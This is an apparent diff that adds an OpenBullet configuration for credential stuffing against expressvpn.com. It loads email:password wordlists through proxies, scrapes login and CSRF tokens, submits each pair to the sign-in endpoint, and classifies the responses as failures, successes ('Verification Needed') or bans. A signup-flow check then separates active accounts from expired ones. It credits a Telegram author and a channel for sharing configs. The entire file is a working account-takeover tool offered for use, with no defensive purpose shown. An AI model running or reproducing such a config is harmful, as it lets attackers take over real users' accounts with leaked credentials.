@@ -1,0 +1,162 @@
+[SETTINGS]
+{
+  "Name": "expressvpn.com mobile",
+  "SuggestedBots": 60,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-04T23:23:21.2964805+04:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://www.expressvpn.com/sign-in" 
+  
+  HEADER "Host: www.expressvpn.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+  HEADER "Referer: https://www.expressvpn.com/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#Token PARSE "<SOURCE>" CSS "[name=authenticity_token]" "value" -> VAR "Token" 
+
+#Login REQUEST POST "https://www.expressvpn.com/sessions" EncodeContent=TRUE 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<Token>&location_fragment=&redirect_path=&email=<USER>&password=<PASS>&commit=Sign+In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.expressvpn.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.expressvpn.com/sign-in" 
+  HEADER "Origin: https://www.expressvpn.com" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password." 
+  KEYCHAIN Success OR 
+    KEY "Verification Needed" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+#Get REQUEST GET "https://www.expressvpn.com/order" 
+  
+  HEADER "Host: www.expressvpn.com" 
+  HEADER "Sec-Ch-Ua: \"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"99\"" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: close" 
+
+#csrfToken PARSE "<SOURCE>" CSS "[name=csrf-token]" "content" -> VAR "csrfToken" 
+
+#EncodecsrfToken FUNCTION URLEncode "<csrfToken>" -> VAR "EncodecsrfToken" 
+
+#Put REQUEST PUT "https://www.expressvpn.com/signup/depart" 
+  CONTENT "{\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.expressvpn.com" 
+  HEADER "Sec-Ch-Ua: \"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"99\"" 
+  HEADER "X-Csrf-Token: <csrfToken>" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Origin: https://www.expressvpn.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.expressvpn.com/order" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#US FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#Post REQUEST POST "https://www.expressvpn.com/signup" 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<EncodecsrfToken>&signup%5Bpackage_id%5D=3&signup%5Bforter_token%5D=ee18c4842d894947b8bfca305ec82103_1648107562318__UDF43_13ck_tt&signup%5Bpayment_method%5D=6&signup%5Bemail%5D=<US>&signup%5Bfirst_name%5D=&signup%5Blast_name%5D=&signup%5Bzip%5D=&signup%5Bcc_number_is_pasted%5D=0&signup%5Bcc_no%5D=&signup%5Bexpiry_month%5D=&signup%5Bexpiry_year%5D=&signup%5Btwo_digit_expiry_year%5D=&signup%5Bccv%5D=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
+  HEADER "origin: https://www.expressvpn.com" 
+  HEADER "referer: https://www.expressvpn.com/order" 
+
+#waitFor PARSE "<ADDRESS>" LR "&wait_for=" "" -> VAR "waitFor" 
+
+#csrfToken2 PARSE "<SOURCE>" CSS "[name=csrf-token]" "content" -> VAR "csrfToken2" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "wait_for: \"" 
+
+#Delay FUNCTION Delay "2000" -> VAR "Delay" 
+
+BEGIN SCRIPT JavaScript
+Time = Date.now();
+END SCRIPT -> VARS "Time"
+
+#Get REQUEST GET "https://www.expressvpn.com/signup/waiting?wait_for=<waitFor>&_=<Time>" 
+  
+  HEADER "Host: www.expressvpn.com" 
+  HEADER "Sec-Ch-Ua: \"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"99\"" 
+  HEADER "X-Csrf-Token: <csrfToken2>" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.expressvpn.com/signup/please_wait?payment_method=6&redirect=1&wait_for=<waitFor>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Get REQUEST GET "https://www.expressvpn.com/order" 
+  
+  HEADER "referer: https://www.expressvpn.com/signup/please_wait?payment_method=1&wait_for=<waitFor>" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<SOURCE>" DoesNotContain "Email already has active account" 
+
+SET CAP "Author Telegram" "@wanted_boy"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletConfigs"
+
